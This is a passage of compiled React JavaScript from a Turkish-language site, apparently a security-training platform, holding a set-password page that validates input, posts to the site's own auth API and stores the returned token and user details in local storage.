@__PURE__ */ React.createElement("span", { className: "text-[#00ff88] text-lg" }, "\u2714"), /* @__PURE__ */ React.createElement("span", { className: "text-[#9fc4b5] text-sm font-mono" }, f))))), /* @__PURE__ */ React.createElement(FooterCmp, { navigate }));
  };
  var SetPasswordPage = ({ navigate, data }) => {
    const HeaderCmp = window.SKHeader || (() => null);
    const FooterCmp = window.SKFooter || (() => null);
    const [pw, setPw] = useState("");
    const [pw2, setPw2] = useState("");
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState("");
    const [done, setDone] = useState(false);
    const token = data && data.token;
    const handleSubmit = async () => {
      setError("");
      if (!pw || pw.length < 6) {
        setError("\u015Eifre en az 6 karakter olmal\u0131d\u0131r.");
        return;
      }
      if (pw !== pw2) {
        setError("\u015Eifreler e\u015Fle\u015Fmiyor.");
        return;
      }
      setLoading(true);
      try {
        const res = await fetch("/api/auth/set-password", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ token, password: pw })
        });
        const d = await res.json();
        if (res.ok && d.token) {
          localStorage.setItem("sk_token", d.token);
          if (d.user) {
            localStorage.setItem("sk_user_name", d.user.name || "");
            localStorage.setItem("sk_user_email", d.user.email || "");
            localStorage.setItem("sk_user_points", d.user.points || 0);
            localStorage.setItem("sk_user_solved", d.user.solved_count || 0);
            localStorage.setItem("sk_user_level", d.user.level || 1);
            localStorage.setItem("sk_user_rank", d.user.rank_val || 1e3);
            localStorage.setItem("sk_user_badges", d.user.badges || 0);
            localStorage.setItem("sk_user_streak", d.user.streak || 1);
            localStorage.setItem("sk_user_is_premium", d.user.is_premium ? "true" : "false");
            localStorage.setItem("sk_user_is_vip", d.user.is_vip ? "true" : "false");
            localStorage.setItem("sk_user_subscription", d.user.subscription || "free");
          }
          window.__SK_USER_FETCHED = false;
          window.dispatchEvent(new Event("sk_user_update"));
          setDone(true);
          setTimeout(() => navigate("dashboard"), 2500);
        } else {
          setError(d.error || "Bir hata olu\u015Ftu.");
        }
      } catch (err) {
        setError("Ba\u011Flant\u0131 hatas\u0131. L\xFCtfen tekrar deneyin.");
      } finally {
        setLoading(false);
      }
    };
    if (!token) {
      return /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(HeaderCmp, { navigate }), /* @__PURE__ */ React.createElement("div", { className: "min-h-screen flex items-center justify-center" }, /* @__PURE__ */ React.createElement("div", { className: "text-center" }, /* @__PURE__ */ React.createElement("h1", { className: "text-2xl text-[#eafff5] mb-4" }, "Ge\xE7ersiz Ba\u011Flant\u0131"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] mb-6" }, "\u015Eifre belirleme ba\u011Flant\u0131s\u0131 ge\xE7ersiz veya eksik."), /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("home"), className: "text-[#00ff88] hover:underline font-mono" }, "\u2190 Anasayfaya D\xF6n"))), /* @__PURE__ */ React.createElement(FooterCmp, { navigate }));
    }
    return /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(HeaderCmp, { navigate }), /* @__PURE__ */ React.createElement("div", { className: "min-h-screen flex items-center justify-center px-4 py-20" }, /* @__PURE__ */ React.createElement("div", { className: "w-full max-w-md rounded-2xl border border-[#0c2719] p-8", style: { background: "linear-gradient(165deg,#0a1f15,#04100a)" } }, done ? /* @__PURE__ */ React.createElement("div", { className: "text-center py-6" }, /* @__PURE__ */ React.createElement("div", { className: "w-16 h-16 rounded-full bg-[#00ff88]/10 border-2 border-[#00ff88] grid place-items-center mx-auto mb-5" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#00ff88] text-3xl" }, "\u2713")), /* @__PURE__ */ React.createElement("h2", { className: "text-xl text-[#eafff5] font-disp font-bold mb-3" }, "\u015Eifreniz Belirlendi!"), /* @__PURE__ */ React.createElement("p", { className: "text-[#9fc4b5] text-sm mb-4" }, "Kontrol panelinize y\xF6nlendiriliyorsunuz..."), /* @__PURE__ */ React.createElement("div", { className: "w-6 h-6 border-2 border-[#00ff88] border-t-transparent rounded-full animate-spin mx-auto" })) : /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement("div", { className: "text-center mb-8" }, /* @__PURE__ */ React.createElement("span", { className: "w-10 h-10 border border-[#00ff88] rounded-lg grid place-items-center text-[#00ff88] font-mono text-base font-bold mx-auto mb-4 inline-flex" }, ">_"), /* @__PURE__ */ React.createElement("h1", { className: "text-2xl text-[#eafff5] font-disp font-bold mb-2" }, "\u015Eifrenizi Belirleyin"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-sm" }, "Hesab\u0131n\u0131za eri\u015Fmek i\xE7in g\xFC\xE7l\xFC bir \u015Fifre olu\u015Fturun.")), /* @__PURE__ */ React.createElement("div", { className: "space-y-4 mb-6" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-xs text-[#74998a] mb-1.5 font-mono" }, "Yeni \u015Eifre *"), /* @__PURE__ */ React.createElement("input", { type: "password", value: pw, onChange: (e) => setPw(e.target.value), placeholder: "En az 6 karakter", className: "w-full bg-[#04100a] border border-[#103a26] rounded-lg px-4 py-3 text-[#eafff5] text-sm font-mono placeholder-[#5c8a74] focus:border-[#00ff88] outline-none transition-colors" })), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-xs text-[#74998a] mb-1.5 font-mono" }, "\u015Eifre Tekrar *"), /* @__PURE__ */ React.createElement("input", { type: "password", value: pw2, onChange: (e) => setPw2(e.target.value), placeholder: "\u015Eifrenizi tekrar girin", onKeyDown: (e) => e.key === "Enter" && handleSubmit(), className: "w-full bg-[#04100a] border border-[#103a26] rounded-lg px-4 py-3 text-[#eafff5] text-sm font-mono placeholder-[#5c8a74] focus:border-[#00ff88] outline-none transition-colors" }))), error && /* @__PURE__ */ React.createElement("div", { className: "mb-4 p-3 rounded-lg border border-red-500/30 bg-red-500/5 text-red-400 text-xs font-mono" }, error), /* @__PURE__ */ React.createElement("button", { onClick: handleSubmit, disabled: loading, className: "w-full py-3.5 font-mono font-bold text-[#021008] bg-[#00ff88] rounded-xl hover:shadow-[0_0_30px_var(--glow)] disabled:opacity-40 transition-all text-sm text-center" }, loading ? /* @__PURE__ */ React.createElement("span", { className: "flex items-center justify-center gap-2" }, /* @__PURE__ */ React.createElement("span", { className: "w-4 h-4 border-2 border-[#021008] border-t-transparent rounded-full animate-spin" }), "\u0130\u015Fleniyor...") : "\u015Eifremi Belirle")))), /* @__PURE__ */ React.createElement(FooterCmp, { navigate }));
  };
  Object.assign(PAGES, {
    about: AboutPage,
    contact: ContactPage,
    support: SupportPage,
    terms: TermsPage,
    privacy: PrivacyPage,
    notfound: NotFoundPage,
    profile: ProfilePage,
    badges: BadgesPage,
    certificates: CertificatesPage,
    tools: ToolsPage,
    pricing: PricingPage,
    product: ProductDetailPage,
    "set-password": SetPasswordPage
  });
})();
